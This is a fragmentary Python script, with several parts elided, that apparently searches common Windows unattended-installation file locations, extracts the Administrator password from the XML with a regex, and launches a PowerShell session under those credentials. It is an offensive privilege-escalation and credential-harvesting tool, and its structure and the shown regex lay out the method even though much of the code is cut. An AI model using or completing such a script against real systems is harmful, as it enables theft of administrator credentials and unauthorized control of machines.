...
# Common paths where unattended installation files may be located
locations = [
...
# Regex pattern to extract the Administrator password from the XML content
password_pattern = re.compile(r"<AdministratorPassword>.*?<Value>(.*?)</Value>", re.DOTALL)

def extract_password(file_path):
    """Reads a file and extracts the encoded Administrator password, if present."""
...
def open_admin_shell(username, password):
    """Launches a new PowerShell session as the specified user with the given password."""
    ps_script = f'''
...
def main():
    """Searches for unattended install files and attempts to extract and use the admin password."""
